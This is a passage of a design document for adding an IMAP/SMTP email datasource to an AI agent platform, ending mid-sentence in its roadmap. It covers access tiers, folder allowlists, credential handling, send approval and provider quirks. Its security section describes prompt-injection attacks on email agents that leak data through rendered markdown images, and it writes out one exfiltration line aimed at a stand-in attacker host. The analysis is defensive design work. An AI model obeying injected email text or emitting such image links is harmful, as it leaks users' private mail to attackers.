---
tags:
  - data-management
  - credential-management
  - tool-development
  - agent-tools
  - security
---

# Email Datasource (IMAP/SMTP Managed Connector)

Design document for adding `email` as a datasource type so users can attach a mailbox
to projects and jobs with tiered access: read-only, read/write, draft-only composition,
and (gated) send.

> **Status (2026-07-14): PROPOSED, research-hardened.** No implementation yet.
> Reconciled against the datasource changes on develop @ `f50a1039` (the `config`/`read_only`
> columns already exist — no migration needed) and revised after a 12-stream codebase+web
> research pass (2026-07-13). The research digest lives in the session scratchpad; its
> load-bearing conclusions are folded in below. Three product/security decisions were taken
> by the owner on 2026-07-14 and are marked **[DECIDED]** inline.

## Motivation

The user story:

- Attach an email inbox as a datasource, the same way a database or WebDAV share is attached.
- Restrict the agent to **read-only** access, or allow **read/write** (move, flag, file drafts).
- Restrict access to **specific folders** — e.g. a permanent `AI` folder the user moves
  mails into when they want to share them. The folder becomes the share boundary and the
  user becomes the triage layer.
- Eventually: let the agent **send** mail on the user's behalf, with appropriate gating.

This follows the managed-connector pattern from [[datasource_redesign]]: structured tools
as the security boundary, credentials never exposed to the agent or the workspace pod,
read-only enforcement in the tool layer. It is the sixth managed connector after
`postgresql`, `neo4j`, `mongodb`, `webdav`, and the `kb` (OKF) type.

**Why not CLI tools** (himalaya, mbsync, curl `imaps://`): CLI tools execute in the
workspace pod, which would require the IMAP password in the workspace environment —
violating the hard rule that internal credentials never enter the workspace pod
([[credential_file_datasources]] trust model, `feedback_internal_creds_not_in_workspace`).
It would also make the folder allowlist decorative: a CLI holding the account password can
read the entire mailbox. Structured agent-side tools are the only place the permission
model is actually enforceable.

---

## Security posture (read this first)

The single most important finding of the research pass: **the design's original security
story defended the wrong thing.** Gating `send` and defaulting to `draft` does *not* contain
the real exfiltration risk.

### The real exfil channel is rendered output, not `send`

Every documented 2025-2026 email-agent breach — Microsoft 365 Copilot **EchoLeak**
(CVE-2025-32711, zero-click), ChatGPT/Gmail-connector **ShadowLeak**, and **Superhuman AI
itself in January 2026** (the product this project is named after) — exfiltrated data the
same way: a prompt injection in an email body caused the agent to emit a **markdown image
whose URL carried the stolen data in query params**, which the client auto-fetched
**zero-click**. None used a "send email" capability. (evidence:
promptarmor.com/resources/superhuman-ai-exfiltrates-emails; hackthebox.com EchoLeak
write-up; thehackernews.com ShadowLeak.)

Consequences for this design:

1. **Read-tier access alone completes exfiltration** once agent output (or a composed
   draft the user opens to review) is rendered. The whole read→read_write→draft→send tier
   ladder is *orthogonal* to this channel.
2. **The cockpit has this hole open today.** `cockpit/src/app/app.config.ts`'s
   `provideMarkdown()` sets gfm/breaks + citation/math extensions with **no remote-resource
   block** and relies on Angular's HTML sanitizer, which permits `<img src=https://external>`.
   So `![](https://attacker/x?d=<data>)` in any agent response auto-loads. This is a
   pre-existing platform vulnerability that the email feature makes acute.
3. **`draft` leaks zero-click too** — a remote image / tracking pixel in a draft body fires
   the moment the user opens the draft to *review* it, before any send. "Draft-default"
   defers the send to a human but does **not** remove the exfil.
4. **A domain allowlist is not enough** — Superhuman's exfil went through an allowlisted
   `docs.google.com` (Google Forms accepts arbitrary data via GET).

### The lethal trifecta and what we cut

The frame is Simon Willison's **lethal trifecta**: private data + untrusted content +
external communication. An email datasource supplies the first two the instant it reads a
body. The removable leg is **external communication** — but "external communication" is not
just `email_send`; it is **also** the rendered-output channel above **and every other egress
tool** the job carries (`web_search`, `browser_direct`, `shell`, `git` push, `webdav`
write, and `communication/send_message`, which the loop injects into *every* worker).

### Decisions taken (owner, 2026-07-14)

- **[DECIDED] Recipients: reply-only by default.** `email_draft`/`email_send` derive To/Cc
  from the **thread being replied to** (the source message's headers), never from the model
  or the email body. New compositions to novel addresses require an explicit per-datasource
  **recipient/domain allowlist**. This kills the "injection picks the destination"
  (reply/forward/CC-to-attacker) exfil and is a distinct axis from the folder (read-scope)
  allowlist.
- **[DECIDED] Co-attached egress tools: allowed, risk documented.** We will **not** deny
  `web_search`/`browser`/`shell`/`git`/`webdav`/`send_message` on email jobs, and will not
  build a taint gate for v1. This is a deliberate, accepted residual risk. **Because we
  accept it, the output-side egress control below is promoted to a hard P0** — it becomes
  the primary defense, not a backstop. The residual risk (an injected body steering a
  co-attached tool to exfiltrate) is documented here and must be repeated in the user-facing
  datasource docs.
- **[DECIDED] Send gating: gate by default + a grant-gated user override.** Send freezes for
  human approval by default. A per-datasource **`unattended_send`** toggle can turn that off,
  but **enabling the toggle requires a capability grant** (`email_autonomous_send`,
  deny-by-default, admin-grantable — mirrors the `public_datasources` grant from
  [[public_datasources]]). Autonomy level (`full`/`review`/…) **no longer controls send
  gating** — this closes the "autonomy=full loop jobs get ungated send" hole, because
  unattended send now requires an explicit, admin-granted, per-datasource opt-in instead of
  falling out of the autonomy setting.

### Layered defenses (in priority order)

- **P0 — Output-side egress control (cross-cutting, cockpit + draft compose).** Neutralize
  remote images in *agent output* (configure `ngx-markdown` to drop/proxy external image
  `src` + reference-style images; verify Angular's sanitizer isn't silently permitting
  remote `<img>`), and **sanitize composed drafts before IMAP APPEND** (strip remote
  images/tracking pixels; **plain-text drafts are the v1 default**). This is what actually
  stopped EchoLeak-class attacks in production (Google's fix "identifies external image URLs
  and will not render them"). Owned as its own security item; the email **read tier can ship
  alongside it, but the draft/send tiers depend on draft sanitization.**
- **P1 — Recipient constraint (reply-only default + allowlist)** as decided above.
- **P1 — Grant-gated send** as decided above; plus **send/draft rate limits** (cap per job
  and per mailbox per hour) and an outbound content scan for obvious secrets — bounds blast
  radius and yields a detectable signal.
- **P1 — Approval/preview UI as a security control**: render draft/send previews with remote
  images **blocked**, URLs **fully expanded** (no hidden hrefs), recipients highlighted — so
  a human reviewer can actually see a tracking pixel or a data-laden link. HITL is false
  comfort if the preview hides the payload.
- **P2 — Strip hidden content in `email_read`** before it reaches context: remove
  white-on-white / `display:none` / zero-size-font / offscreen text / HTML comments /
  zero-width unicode, then wrap the body with the existing `fence_*` untrusted-content
  helper (`src/core/expert_resolution.py`). **Defense-in-depth, not a solution** — every
  vendor classifier of this kind has been bypassed; the primary control is architectural
  (cut the egress channel), not detection.
- **Keep (validated, do not weaken)**: managed connector with creds out of the workspace
  pod; email never published (`is_global` rejected); folder allowlist as read-scope triage
  boundary; `send` + empty folder allowlist rejected; bodies labeled untrusted; context
  discipline (bodies/attachments to files, snippets only).
- **Security win of the minimal surface**: IMAP v1 **cannot create a forwarding rule /
  auto-reply / OOF** (the canonical persistent-exfil vector). The future Gmail-API / MS-Graph
  backends *can* — this doc **pre-commits** that those backends must never map
  filter/forwarding-rule, auto-reply/OOF, or delegation scopes into the tool surface.

---

## Provider reality (why v1 is IMAP/SMTP + app passwords)

Plain-password IMAP is dead at the large providers; the protocol is not. Research
(2025-2026 sources) confirmed the shape but **corrected the Gmail row** — "Gmail" is two
different products.

| Provider | v1 support | Notes (verified 2026) |
|----------|-----------|-----------------------|
| **Consumer `@gmail.com`** | ✅ app password | Requires 2-Step Verification enabled first; IMAP is always-on since Jan 2025. `imap.gmail.com:993` / `smtp.gmail.com:587`. |
| **Google Workspace (custom domain)** | ❌ v1 | **OAuth-only since 2025-05-01**; app-password IMAP is rejected. A form that just says "Gmail" silently fails for every company-domain user — the UI must distinguish consumer from Workspace. |
| **Fastmail** | ✅ app password | **Paid plans only** — the Basic plan excludes IMAP/SMTP and can't create app passwords. `imap.fastmail.com:993` / `smtp.fastmail.com:587`. |
| **iCloud Mail** | ✅ app-specific password | Requires 2FA. **IMAP username = local-part only**, SMTP username = full address. `imap.mail.me.com:993` / `smtp.mail.me.com:587`. |
| **Yahoo** | ✅ app password | 2-step verification; IMAP may need manual enable. `imap.mail.yahoo.com:993` / `smtp:465\|587`. |
| **mailbox.org** | ✅ app password | Now **required** under Login 2.0 (since ~Apr 2025), per-protocol toggles. `imap.mailbox.org:993` / `smtp.mailbox.org:587`. |
| **GMX / web.de** | ✅ app password | Normal password still works too (no forced 2FA) — rare. `imap.gmx.net:993` / `mail.gmx.net:465`. |
| **Self-hosted (Dovecot)** | ✅ password / app password | Operator-controlled auth; safest v1 target. |
| **Microsoft 365 / Outlook.com** | ❌ v1 | Basic-auth IMAP killed 2023; **personal outlook.com too now**; SMTP AUTH final retirement Mar–Apr 2026. Needs OAuth/XOAUTH2 + Entra app registration — a real v2 backend. |
| **Proton** | ❌ v1 | No server-side IMAP (E2E). Needs Proton **Bridge** (paid, binds `127.0.0.1` on the user's own machine — architecturally incompatible with a hosted connector) or unofficial `hydroxide`. |

**Gmail via OAuth is not a cheap escape hatch**: the mail scope is *restricted*, so a
published app needs a **CASA Tier 2** assessment (~$500–$4,500+, no free self-scan,
**re-validated annually**). Budget it as a deliberate later backend, not a quick win.

**Decision**: v1 ships one backend, `imap_smtp`, behind a neutral tool surface, for the ✅
providers above. Gmail-API, MS-Graph, and Proton become additional backends of the same
`email` type later (`credentials.backend` discriminator); the OAuth apparatus is out of v1
scope. The cockpit form must show an inline "needs OAuth — not yet supported" for
Workspace/M365/Proton rather than letting auth silently fail, and should offer per-provider
presets (host/port + the app-password setup hint).

---

## Trust and permission model

**Posture: managed connector.** The IMAP/SMTP connection object lives in the agent process,
created by `datasource_setup.create_datasource_connection()` and reached via
`ToolContext.get_datasource("email")`. Credentials are injected by the orchestrator at
dispatch, **encrypted at rest** in the `credentials` JSONB via the existing AES-256-GCM
layer (`orchestrator/security/crypto.py`, applied on every create/update regardless of type
— **zero extra work for email**), and never materialized into the workspace pod, env vars,
or tool output.

**Folder scoping is app-level enforcement.** IMAP has no folder-scoped credentials — the app
password can read the whole mailbox. The allowlist (`config.folders`) is checked inside every
tool call (LLM schema binding is the primary gate, the runtime check is the backup). Subtree
matching must use the **server-reported hierarchy delimiter** (not a literal `/`) and
normalize INBOX case-insensitively. An empty allowlist means the whole mailbox is in scope
(allowed for read tiers; **rejected for `send`** — see below).

**Access tiers** (`config.access`, set in the cockpit form):

| Tier | Capabilities | Mechanism |
|------|-------------|-----------|
| `read` | list folders, list/read/search messages | IMAP **EXAMINE** (read-only select) **and** `BODY.PEEK` on every fetch — see the imap-tools caveat; must be belt-and-suspenders so the tier genuinely "cannot flip `\Seen`" |
| `read_write` | + move, flag messages | scoped UID `MOVE`/`STORE` (never a bare EXPUNGE — see caveats) |
| `draft` (**default**) | + compose drafts the user sends from their own client | MIME compose + IMAP `APPEND` (with `\Draft`) to the **SPECIAL-USE `\Drafts`** folder — **no SMTP** |
| `send` | + send mail as the user | SMTP submission; **grant-gated approval** (below) |

`draft` is the default and the sweet spot: the agent writes, the human sends from their own
client, nothing leaves without a human action.

**Recipient constraint (reply-only default).** `email_draft`/`email_send` default to
**reply-only**: To/Cc come from the source message's headers via a `reply_to_uid` handle,
never from the model. New compositions require `config.recipient_allowlist` (addresses or
domains); a draft/send whose recipients are neither in-thread nor allowlisted is rejected.
`reply_all` is gated the same as `send` (fan-out amplification).

**Send gating (grant-gated override).** Sending is the highest-blast-radius capability. By
default `email_send` **freezes the whole job for human approval** (mechanism below). A
per-datasource **`config.unattended_send: bool`** (default `false`) can disable the freeze,
but **setting it `true` requires the creating user to hold the `email_autonomous_send`
capability grant** (deny-by-default, admin short-circuits, `restrict_only` — one new entry
in `src/core/capability_grants.py::CATALOG`, exactly like `public_datasources`). If the flag
is `true` but the grant is absent (e.g. revoked later), send **fails closed** to the gated
path. Even with unattended send enabled, reply-only/allowlist and rate limits still apply.
Autonomy level does **not** control send gating.

**Publishing email is rejected.** Per [[public_datasources]], a public (`is_global`)
datasource hands the **publisher's stored credentials** to every attaching user's agent —
for a mailbox, a stranger's agent operating your inbox under your identity. `type='email'`
**rejects `is_global=true`** at create/update (the inverse of the `kb` publish-friendly
guards). Mailboxes are private, project- or job-scoped only.

### Three "read-only" axes — do not conflate

| Concept | Where | Meaning for email |
|---------|-------|-------------------|
| `config.access` (this feature) | `config` jsonb | The tier: `read`/`read_write`/`draft`/`send`. Tool-layer enforced. |
| `datasources.read_only` | column (migration `0056`) | Declarative **publish** flag for `is_global` rows; NULL for private. Surfaces in the agent index via `_declared_ro_note()`. Email is never published, so this stays NULL. |
| `project_read_only` | per-project link | Connector-mode switch. For email it **clamps the tier down to `read`** — but must **not** empty credentials (email needs a live IMAP connection even at `read`; see the managed-connector caveat in Touchpoints). |

---

## Design

### Data model — no new table, no new migration

One datasource row = one mailbox account, on columns that already exist.

- `datasources.type = 'email'`.
- **Secrets** in `credentials` (encrypted automatically):

```json
{
  "backend": "imap_smtp",
  "username": "user@example.com",
  "password": "app-password",
  "imap": { "host": "imap.example.com", "port": 993, "security": "ssl" },
  "smtp": { "host": "smtp.example.com", "port": 465, "security": "ssl" }
}
```

- **Non-secret scoping** in the existing **`config jsonb`** column (migration `0055`, landed
  for OKF `kb`). Stored/read as **plaintext** (queryable, and `redact_datasource` keeps
  `config` so the cockpit can read it back for editing):

```json
{
  "access": "draft",
  "folders": ["AI", "AI/Processed"],
  "drafts_folder": "Drafts",
  "from_address": "user@example.com",
  "recipient_allowlist": [],
  "unattended_send": false
}
```

`drafts_folder` is a **fallback** — the tools resolve the real Drafts target via the
`\Drafts` SPECIAL-USE attribute first (see IMAP caveats). SMTP block omitted unless tier is
`send`. The Postgres create/update/resolve layer is fully generic — **no `postgres.py`
changes**.

### Tool surface — 8 tools, widened signatures

`src/tools/email/tools.py`, mirroring the webdav module (`EMAIL_TOOLS_METADATA` +
`create_email_tools(context)` factory, registry gate on `context.has_datasource("email")`).
The research validated 8 tools as the right minimalist set (LLM tool-selection degrades past
~10-20 tools; 34-54-tool API-mirror servers are cautionary). Capability is added via
**parameters**, not new tools.

| Tool | Tier | Phases | Behavior |
|------|------|--------|----------|
| `email_list_folders` | read | both | Allowed folders only, with message/unseen counts |
| `email_list` | read | both | Envelopes (uid, from, subject, date, flags, size), **UIDs not sequence numbers**, newest-first, paginated |
| `email_search` | read | both | UID `SEARCH` with explicit `CHARSET UTF-8`; date criteria are date-only against INTERNALDATE (BEFORE exclusive); scope to one or all allowed folders; do not rely on `SORT` |
| `email_read` | read | both | Fetch + MIME-parse; **returns `Message-ID`/`In-Reply-To`/`References`** (threading substrate); body→workspace file, attachments **metadata-only by default** (`fetch_attachments` control); returns headers + bounded snippet + pointers; hidden-content stripped + fenced |
| `email_move` | read_write | tactical | `uids: string[]` (batch); scoped UID `MOVE`, or UID COPY+STORE+**scoped** UID EXPUNGE fallback; archive/trash expressed as **move destinations** to SPECIAL-USE folders, never a bare EXPUNGE; allowlist checked on both source and destination |
| `email_flag` | read_write | tactical | `uids: string[]`; set/clear `\Seen`, `\Flagged`. **Description foregrounds "mark read/unread; star/flag"** (the common case), not IMAP jargon |
| `email_draft` | draft | tactical | `reply_to_uid` (+ `reply_all`) params; MIME compose (plain-text default, sanitized); `APPEND` with `\Draft` to the SPECIAL-USE Drafts folder; reply-only recipient default |
| `email_send` | send | tactical | `reply_to_uid` (+ `reply_all`); SMTP submission; grant-gated approval (below); reply-only/allowlist + rate-limited |

**Reply is a parameter, not a tool.** `reply_to_uid` gives the tool a *handle*; the tool
reads the source `Message-ID`/`References`/`From`/`Reply-To` internally and assembles
`In-Reply-To`, `References` (source References + source Message-ID), the `Re:` subject, and
default recipients. **Never expose raw `in_reply_to`/`references` strings to the LLM** — they
mis-assemble the chain. `forward` is deferred to a later `forward_uid` parameter.

**Library**: `imap-tools` (actively maintained, Apache-2.0, zero-dep; `MailMessage` wraps
stdlib `email` for MIME/charset/RFC-2047) for list/search/read/append; **stdlib `smtplib` +
`email.message.EmailMessage`** for send. Add `imap-tools` to the **agent** `requirements.txt`
([[two_requirements_files]]); the orchestrator test endpoint reuses stdlib `imaplib` +
already-present `aiosmtplib`.

### IMAP correctness caveats (must-handle)

The library handles the two hardest cases (BODY.PEEK via `mark_seen=False`, MOVE-with-
fallback) but its defaults are dangerous:

- **`imap-tools` `move()`/`delete()` fallback issues a BARE EXPUNGE** — which removes *every*
  `\Deleted`-flagged message in the folder, not just the moved UIDs (RFC 6851's exact
  motivation). **Do not call it as-is.** Prefer server-side UID `MOVE`; when absent, do UID
  `COPY` + UID `STORE \Deleted` + **UID `EXPUNGE` scoped to the moved UIDs** (RFC 4315
  UIDPLUS), or **fail closed** if UIDPLUS is unavailable.
- **`fetch()` defaults `mark_seen=True`** — contradicts the read tier. Read-tier tools must
  pass `mark_seen=False` **and** open the folder with `EXAMINE` (`readonly=True`) so even an
  accidental non-peek fetch can't flip `\Seen`. Unit-test that list/preview never mutate flags.
- **UID + UIDVALIDITY**: address messages by UID (immutable), capture `UIDVALIDITY` at
  SELECT/EXAMINE, include it with any UID handed to the LLM, and **re-verify before any
  mutating call** — if it changed, refuse and tell the agent to re-list.
- **SPECIAL-USE folder discovery**: resolve Drafts/Sent/Trash via the `\Drafts`/`\Sent`/
  `\Trash` attributes in LIST responses (RFC 6154), `config.drafts_folder` only as fallback.
  Name-matching "Drafts" fails across locales/providers (`[Gmail]/Drafts`, localized names).
- **Gmail labels-as-folders** (detect `X-GM-EXT-1`): a "move" between labels is
  add-label/remove-label; the message persists in `[Gmail]/All Mail`; true delete requires
  `[Gmail]/Trash`. Keep All Mail out of default allowlists (it's the whole mailbox). All
  Mail/Trash/Spam are excluded from SEARCH by default.
- **Hierarchy delimiter**: discover it from LIST; do not assume `/` for subtree allowlist
  matching. Mailbox names are modified UTF-7 (library decodes).
- **MIME**: decode RFC 2047 encoded-word headers; pick `text/plain` from
  multipart/alternative for the snippet and save `text/html` as the artifact; classify parts
  by Content-Disposition; **decode every part with `errors='replace'`** (real mail mislabels
  charsets).
- **Connection lifecycle**: **per-operation connections for v1** with an explicit **socket
  timeout** (a dead long-lived socket wedged the tool node for ~8h in the `search_files`
  incident — `project_search_files_ssh_toolnode_wedge`). If a connection is ever cached
  across tool calls, NOOP every ~5-10 min and re-SELECT + re-read UIDVALIDITY after any
  reconnect.

### `email_read` context discipline

Emails are huge (HTML bodies + attachments) and **must not** bloat context. Follow the
`web_search` fix (`75fcba8d`, `src/tools/research/web.py`), **not** `webdav_read`:

- `webdav_read` is a **trap** — it writes via `workspace.get_path(...)` + `os.makedirs` +
  local write, which is local FS I/O on the agent pod and **does not reach the remote SFTP
  workspace**. Email must route through `workspace_manager.write_file(rel, text)` (body) and
  `workspace_manager.backend.write_file(rel, bytes)` (attachments) — both SFTP-write and
  auto-create parent dirs.
- Layout: `emails/<safe_folder>/<uid>/body.txt` (+ `body.html` raw when HTML-only; snippet
  derived from text via the BeautifulSoup `get_text` recipe), attachments under
  `emails/<folder>/<uid>/att/<sanitized_name>`. Sanitize folder/uid/filename. Guard every
  write in try/except and degrade non-fatally.
- **Bound the snippet in the tool** (module const `MAX_SNIPPET_CHARS ≈ 1000`) — compaction
  runs only at phase boundaries and will not save a giant return mid-phase.
- Return shape: envelope headers (incl. Message-ID/In-Reply-To/References) → **untrusted-
  content fence** → `Snippet:` bounded text → pointers (`Body saved: …`, one line per
  attachment with `_human_size`). **Never inline attachment bytes or full HTML.**
- **`fetch_attachments` control**: default lists attachment metadata (name/size/type) only;
  materialize to `att/` only when named/enabled — avoids pulling a 40 MB blob into the agent
  process blindly.
- **Lite/`none` tier** (`has_workspace()` false / `supports_file_tools` false): fall back to
  a bounded inline excerpt (no pointers), don't fail.
- Strip hidden content (white-on-white, `display:none`, zero-size, zero-width unicode, HTML
  comments) before the body reaches context; wrap with the existing `fence_*` helper.

### Send-tier approval subsystem

"Same pattern as sudo requests" is **not buildable as originally written** — the inline sudo
gate is a NATS request/reply owned by a VM-side daemon, and the worker/agent process has
**no NATS request/reply client**. The only agent-side human-approval primitive is
`context.request_freeze`, which pauses the **whole job**. So the model is
**freeze → whole-job-pause → send-on-resume**, templated on `vm_upgrade_required`:

1. `email_send` (tactical, tier-checked). If `config.unattended_send` **and** the owner holds
   `email_autonomous_send` → SMTP-submit directly (still reply-only/allowlist + rate-limited).
   Else → **stage** the MIME to `emails/outbox/<hash>.eml`, compute a `content_hash`, and
   call `context.request_freeze({freeze_type:'email_send_approval', request_type:'email_send',
   to, subject, from_address, datasource_name, staged_ref, content_hash, snippet})`. **Do not
   send before the freeze.**
2. `completion.determine_job_status`: map `email_send_approval` → `paused` (next to the
   `vm_upgrade_required` case). `freeze_data` set ⇒ `get_dispatchable_jobs` excludes it, so
   it can't fire without approval. **Verify the loop-job branch (`completion.py:851-863`)
   doesn't sweep this freeze_type to `completed`.**
3. `complete_job`: add `email_send_approval` to `_NOTIFIABLE_FREEZE_TYPES`; insert a
   `sudo_approval_requests` row with `request_type='email_send'` (the table's `request_type`
   is a generic VARCHAR — **no migration**), human-scale TTL (24h), SSE `new_request`.
4. Approve/deny endpoints (dispatch on `request_type`). Approve → resume with `freeze_data`
   cleared (mirror `_resume_job_without_vm_internal`, **not** `_internal_resume_job` which
   doesn't clear it) + a durable **approval token bound to `content_hash`** + `queued_feedback`
   ("send X approved — deliver the staged draft"). Deny → sticky denial. On resume,
   `email_send` is **idempotent + hash-checked**: only submit if the staged draft's
   `content_hash` matches an approval token (so an approved click can't authorize a
   *different* message than the human saw), then clear the token.
5. **TTL expiry sweeper**: on expiry, **drop-not-send** and clear `freeze_data`.
6. **Cockpit reuses the existing sudo-approvals surface for free** (same `sudo_approval_requests`
   row + SSE; `sudo.service.ts`, action-center, notification-bell) — only add an
   `request_type='email_send'` renderer (to/subject/snippet + Approve/Deny), hardened per the
   preview-as-security-control rule.

### Tier enforcement placement

**Both layers**, split by what each can express:

- **Primary = dispatch-time tool selection** (`DS_TOOL_MAP` / `_build_datasource_tool_override`):
  map `config.access` → a tool-name subset, floored to `read` by `project_read_only`. A name
  not emitted is never bound and literally cannot be called. Same mechanism as the existing
  `project_read_only` clamp — but the map must become **tier-keyed** (it's binary read/write
  today, which can't express 4 tiers).
- **Backup = per-call closures** in `create_email_tools`, for what selection can't express:
  the **folder allowlist** (argument-level; the *only* folder enforcement point), the
  **send approval/grant gate**, a defensive tier re-check, and the read-tier **EXAMINE**
  connection mode.

Do **not** make the factory omit tools by tier — that duplicates the dispatch name-filter.

---

## Touchpoints

Line numbers drift; **anchor on the symbol**. Verified against develop @ `f50a1039`. The OKF
`kb` commit (`e27a9313`) is the plumbing template; webdav is the tool-module template. **The
four ⚠️ rows would make the feature silently inert if missed** — none were in the original
touchpoint table.

| Component | Change |
|-----------|--------|
| migrations | **None.** `config` (0055), `read_only` (0056), and `sudo_approval_requests.request_type` (generic VARCHAR) all already exist. |
| `main.py` create `valid_types` set (~`:15367`) | Add `email` (+ the cosmetic Pydantic `type` description ~`:5271`) |
| `main.py` create/update **config guard** (~`:15419` / ~`:15548`) | ⚠️ Currently `raise 400 "config is only supported for OKF Knowledge Bases"` for non-kb. **Relax to accept+validate email config** (access enum; folders; drafts_folder; from_address; recipient_allowlist; unattended_send). Reject `access='send'` + empty `folders`. Reject `unattended_send=true` unless owner holds `email_autonomous_send`. |
| `main.py` `is_global` guards (create ~`:15396`, update ~`:15480`) | Add typed rejection of `is_global=true` for `type='email'` |
| `main.py` `_build_datasources_payload` (~`:15078`) | ⚠️ `entry['config']` is set **only for `kb`** (~`:15086`). **Add an `email` branch** forwarding config (access floored to `read` when `project_read_only`) — else the tools have no tier/allowlist. |
| `main.py` `managed_types` set (~`:15052`) + creds-empty branch (~`:15068`) | ⚠️ `if ds_type in managed_types and is_read_only: creds={}` — **exempt email** (it needs live IMAP creds at every tier). |
| `main.py` `DS_TOOL_MAP` + selection (~`:14952` / ~`:15006`) | ⚠️ Add a **tier-keyed** `email` entry; **and** change `elif ds_type=='webdav'` at ~`:15006` to `in ('webdav','email')` or read-write+ email gets **zero tools** (webdav-only CLI carve-out). |
| `src/api/persistent_app.py` `_ds_tool_map` (~`:1512`) | ⚠️ **Second, hand-duplicated** tool map for persistent sessions. Add the identical `email` entry (its apply logic has no CLI trap). Consider unifying the two maps. |
| `src/core/loader.py` `ToolsConfig` (~`:1447`) + 2 builders (~`:2227`,`:2460`) + `_category_names` (~`:4220`) | ⚠️ **4 sites.** Add `email: List[str]` field, `email=tools_data.get('email',[])` in both builders, `'email'` in the flatten tuple — else the injected email tool list is silently dropped before the registry sees it. Add `email: []` to `config/defaults.yaml` (+ `persistent_defaults.yaml`). |
| `POST /api/datasources/{id}/test` (~`:15674`) | **Explicit if/elif chain, NOT a `managed_types` gate** (correcting the old doc). Add an `elif ds_type=='email'` before generic/repository; IMAP login + verify each allowlisted folder exists (+ SMTP EHLO/auth when `send`); enforce `send`+empty-folders reject; **wrap in `asyncio.to_thread` with a ~10s timeout** (the sync branches block the event loop — don't copy that). |
| `src/core/datasource_setup.py` `create_datasource_connection` (~`:568`) | Add an `email` branch before the `else: raise ValueError`; return an **`EmailConnection` wrapper** bundling the IMAP client + SMTP params + resolved config (access/folders/drafts_folder/from_address/recipient_allowlist), with a `.close()`. `process_datasources` already routes email to the connection path (not in the CLI tuple). |
| `src/core/datasource_setup.py` `inject_datasource_index` (~`:837`) | Add an `elif ds_type=='email'` in the "others" loop (email currently falls to the generic else) listing tier + allowed folders, honoring `_declared_ro_note()`. **Do not** touch the dead duplicate at `agent.py:~3140`. |
| `src/tools/email/` (new) | `tools.py` (`EMAIL_TOOLS_METADATA` + `create_email_tools`) + `__init__.py` re-exporting `create_email_tools`, `get_email_metadata` |
| `src/tools/registry.py` | Import + `TOOL_REGISTRY.update(get_email_metadata())` (~`:23`/`:78`) + an `if 'email' in tools_by_category:` gate block mirroring webdav (~`:476`) |
| `src/core/capability_grants.py::CATALOG` | New `email_autonomous_send: {type:'bool', default:False, restrict_only:True}` (mirrors `public_datasources`); helper `user_can_autonomous_send(user)` in `postgres.py` |
| cockpit `datasource-list.component.ts` | New `@if (formData.type==='email')` field block (imap/smtp host+port+security with provider presets, folder-allowlist chips, tier radio, recipient-allowlist chips, unattended-send toggle behind the grant, app-password hint); extend `buildCredentials()` (nested imap/smtp) + the **3 config ternaries** + formData model + edit-populate |
| cockpit `api.model.ts` | `email` in `DatasourceType`; extend `DatasourceConfig` (access/folders/drafts_folder/from_address/recipient_allowlist/unattended_send) |
| cockpit `app.config.ts` (**P0 security, separate item**) | Neutralize/proxy remote image `src` in agent-output markdown; verify Angular sanitizer |
| cockpit i18n `en.json` + `de-DE.json` | Form labels/hints (kb-sized addition) |
| agent `requirements.txt` | `imap-tools` |

Optional/nice-to-have: MCP `create_datasource` (`server.py:~2128`) has no `config` param, so
email/kb can't be MCP-created with config — add one if agent-created mailboxes are wanted.
Unify the two tool maps + a shared `effective_access` clamp helper. Add an `email` branch to
`_build_datasource_knowledge_note` (else-fallback works).

---

## Testing

- **Integration/k3d — GreenMail** (`greenmail/standalone`, pinned e.g. `:2.1.9`): the only
  mainstream server doing **IMAP+IMAPS+SMTP+SMTPS in one container**, so it backs the read/
  read_write/draft tiers *and* captures `send`. **Mailpit/MailHog are rejected** (SMTP-sink
  only, no IMAP server). Ports 3025/3143/3993/8080; `GREENMAIL_OPTS=-Dgreenmail.setup.test.all
  -Dgreenmail.auth.disabled`.
  - **Seeding**: GreenMail's REST API **cannot create non-INBOX folders or APPEND to a chosen
    folder** — seed with a tiny `imaplib` init step (`CREATE 'AI'`, `CREATE 'Drafts'`, `APPEND`
    fixture `.eml` files with flags). Commit `.eml` fixtures. Use REST only for purge/reset.
  - **Wiring**: add an isolated `greenmail` service to `docker-compose.dev.yaml` (**keep it
    separate from the existing Proton Bridge SMTP wiring at lines 238-241**); in k3d, a
    Deployment+ClusterIP behind a values flag (`test.greenmail.enabled`, default false) so it
    never ships to prod.
- **Unit** (`tests/test_email_tools.py`, fake mailbox via `ToolContext`): folder-allowlist
  enforcement (out-of-scope folder → refusal), tier enforcement, snippet/pointer output shape
  + snippet cap regardless of body size, attachments to `att/` never inlined, `reply_to_uid`
  header assembly.
- **Semantic cases (the ones that catch real bugs)**: move-fallback on a server *without* the
  MOVE capability + a decoy `\Deleted` message that must survive; EXAMINE read tier asserting
  `\Seen` never set; UIDVALIDITY bump between list and move; non-`/` delimiter + modified-UTF-7
  folder; RFC 2047 subject + multipart/alternative + mislabeled-charset body; APPEND asserting
  `\Draft` present; `send`+empty-allowlist rejected.
- **Live smoke**: a real consumer-Gmail app-password mailbox with an `AI` folder; walk
  list → read → move → draft; verify Gmail label/All-Mail behavior separately.

---

## Implementation roadmap

1. **P0 — plumbing (no migration)**: type whitelist; config accept+validate on create+update
   (incl. send/empty-folders + unattended-send-grant checks); `is_global` rejection; config
   forwarding in `_build_datasources_payload`; tier-keyed `DS_TOOL_MAP` + the `:15006`
   webdav-carve-out fix; the session `_ds_tool_map`; the 4 `loader.py` sites; test endpoint
   (via `asyncio.to_thread`); cockpit form + i18n; the `email_autonomous_send` grant; GreenMail
   infra.
2. **P0 (parallel, separate owner) — output-side egress hardening**: cockpit remote-image
   neutralization in agent output. Blocks the draft/send tiers; the read tier may ship
   alongside.
3. **P1 — read tier**: `EmailConnection` wrapper + connection factory; the 4 read tools
   (`email_read` with remote-SFTP file writes, threading headers, hidden-content stripping,
   `fetch_attachments`); registry; datasource index; unit + GreenMail tests.
4. **P2 — read_write + draft tiers**: `email_move` (scoped UID EXPUNGE, never bare),
   `email_flag` (batch `uids[]`), `email_draft` (`reply_to_uid`, SPECIAL-USE Drafts, draft
   sanitization + plain-text default). **End of the default product experience.**
5. **P3 — send tier + approval subsystem**: the freeze/resume/content-hash machinery; the
   `unattended_send` toggle honoring the grant; reply-only/allowlist enforcement; rate limits;
   cockpit approval renderer (hardened preview); TTL drop-not-send sweeper; loop-branch
   verification.
6. **Later, separate docs**: Gmail-API + MS-Graph OAuth backends (**never** mapping
   filter/forwarding/OOF/delegation); Proton via `hydroxide`; the automations "new mail →
   job" trigger (poll via the cron engine for v1 — stateless/restart-safe; IMAP IDLE later as
   a single-watcher latency optimization, one socket per `AI` folder, respecting Gmail's ~15
